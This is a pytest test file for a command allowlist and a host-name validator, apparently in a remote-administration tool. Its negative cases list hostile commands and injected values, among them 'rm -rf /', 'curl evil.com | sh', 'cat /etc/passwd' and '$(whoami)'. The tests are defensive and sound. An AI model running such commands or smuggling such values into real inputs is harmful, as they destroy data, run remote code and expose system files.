import pytest

from tools.access import _is_command_allowed, _validate_host


@pytest.mark.parametrize(
    "command",
    [
        "docker ps",
        "docker ps -a",
        "systemctl status nginx",
        "uptime",
        "df -h",
        "ps aux",
        "uname -a",
    ],
)
def test_allowed_commands_pass(command):
    assert _is_command_allowed(command) is True


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "curl evil.com | sh",
        "docker ps; rm -rf /",
        "systemctl stop nginx",
        "shutdown now",
        "cat /etc/passwd",
        "",
    ],
)
def test_disallowed_commands_blocked(command):
    assert _is_command_allowed(command) is False


@pytest.mark.parametrize("host", ["45.187.68.91", "xfiber.net.br", "sub.domain.com.br"])
def test_valid_hosts_accepted(host):
    assert _validate_host(host) == host


@pytest.mark.parametrize("host", ["; rm -rf /", "host && curl evil.com", "$(whoami)", ""])
def test_invalid_hosts_rejected(host):
    with pytest.raises(ValueError):
        _validate_host(host)
